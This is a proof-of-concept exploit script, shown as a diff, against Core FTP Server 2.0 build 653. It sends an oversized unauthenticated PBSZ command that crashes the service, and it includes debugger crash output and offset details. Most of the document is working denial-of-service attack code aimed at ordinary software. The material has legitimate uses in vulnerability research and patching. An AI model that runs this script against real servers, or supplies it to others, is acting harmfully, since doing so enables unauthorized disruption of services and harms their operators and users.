@@ -1,0 +1,79 @@
+# Exploit Title: Core FTP 2.0 build 653 - 'PBSZ' - Unauthenticated - Denial of Service (PoC)
+# Date: 2019-03-12
+# Exploit Author: Hodorsec (hodorsec@protonmail.com / hodor@hodorsec.com)
+# Vendor Homepage: http://www.coreftp.com/
+# Software Link: http://coreftp.com/server/download/archive/CoreFTPServer653.exe
+# Version: Version 2.0, build 653, 32-bit
+# Tested on: Windows 8.1 6.3 (build 9600)
+# CVE: N/A
+
+# Description: 
+# CoreFTP 2.0 is vulnerable to a DoS attack via the PBSZ command. Ironically, this command is being used for "Protection Buffer Size" 
+# and CoreFTP responds unauthenticated.
+# The PBSZ command in CoreFTP only allows for a certain length of the string to be vulnerable to a DoS.
+# This script triggers the DoS and filling ECX with the intented buffer. 
+# Although NSEH/SEH is overwritten, the executable binary is SafeSEH protected and no other assemblies are referenced.
+
+# Replication:
+# - Install CoreFTP and setup a domain with an IP and path
+# - Start the service or click "Start"
+# - No need to add users or set anything specific: just run the script and watch it crash
+
+# Crash as service:
+# (7e0.bf4): Access violation - code c0000005 (first chance)
+# First chance exceptions are reported before any exception handling.
+# This exception may be expected and handled.
+# *** ERROR: Module load completed but symbols could not be loaded for C:\Program Files (x86)\CoreFTPServer\coresrvr.exe
+# eax=00000000 ebx=00a5b048 ecx=42424242 edx=00000000 esi=00000258 edi=00000000
+# eip=004491f5 esp=0128c4bc ebp=0129f684 iopl=0         nv up ei ng nz na po nc
+# cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00010282
+# coresrvr+0x491f5:
+# 004491f5 83b92c08000000  cmp     dword ptr [ecx+82Ch],0 ds:002b:42424a6e=????????
+
+#!/usr/bin/env python
+import sys, socket, struct, time
+ 
+if len(sys.argv) <= 2:
+    print "Usage: python " + sys.argv[0] + " [host] [port]"
+    exit()
+ 
+host = sys.argv[1]    
+port = int(sys.argv[2])
+
+# Maximum length
+maxlen = 211
+
+# Offsets
+crash_ecx = 199
+crash_nseh = 99
+
+# Variables
+prefix = "A" * crash_ecx
+ecx = "B" * 4                                   # 004491f5; CMP DWORD PTR DS:[ECX+82c],0 
+suffix = "C" * (maxlen - len(prefix + ecx))
+
+# Payload
+payload = prefix + ecx + suffix
+
+print "[+] Connecting to " + host + "\n"
+
+try:
+        print "[+] Sending payload with " + str(len(payload)) + " length message..."
+
+    
+        req = (
+                "PBSZ " + payload
+        )
+    
+        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        s.settimeout(2)
+        s.connect((host, port))
+        s.send(req)
+        s.recv(1024)
+        s.close()
+
+        time.sleep(0.5)
+except Exception,e:
+        print "[!] Error occured: " + str(e)
+        print "[*] Crashed occured at buffer length: " + str(len(payload))
+        sys.exit()
